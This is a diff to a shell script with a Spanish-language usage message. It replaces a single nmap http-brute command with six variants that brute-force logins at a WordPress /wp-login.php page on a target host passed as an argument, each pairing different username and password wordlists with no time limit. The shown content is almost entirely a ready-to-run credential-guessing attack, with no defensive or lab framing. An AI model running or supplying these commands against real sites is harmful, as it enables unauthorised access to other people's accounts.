@@ -44,5 +44,10 @@ fi
 echo
 echo "hay que incluir en eñ script  argumentos como p.ej.: –script-args http-brute.path=/admin/ "
 echo
-nmap -Pn -sVC $1 $2 -p 80,443 --script http-brute -script-args userdb=usuarios.txt,passdb=claves.txt,unpwdb.timelimit=0,http-brute.path=/
+nmap -Pn $1 -p 80,443 -sVC --script http-brute -script-args userdb=usuarios0.txt,passdb=claves0.txt,unpwdb.timelimit=0,http-brute.path=/wp-login.php?
+nmap -Pn $1 -p 80,443 -sVC --script http-brute -script-args userdb=usuarios0.txt,passdb=claves.txt,unpwdb.timelimit=0,http-brute.path=/wp-login.php?
+nmap -Pn $1 -p 80,443 -sVC --script http-brute -script-args userdb=usuarios0.txt,passdb=claves2.txt,unpwdb.timelimit=0,http-brute.path=/wp-login.php?
+nmap -Pn $1 -p 80,443 -sVC --script http-brute -script-args userdb=usuarios.txt,passdb=claves0.txt,unpwdb.timelimit=0,http-brute.path=/wp-login.php?
+nmap -Pn $1 -p 80,443 -sVC --script http-brute -script-args userdb=usuarios.txt,passdb=claves.txt,unpwdb.timelimit=0,http-brute.path=/wp-login.php?
+nmap -Pn $1 -p 80,443 -sVC --script http-brute -script-args userdb=usuarios.txt,passdb=claves2.txt,unpwdb.timelimit=0,http-brute.path=/wp-login.php?
 
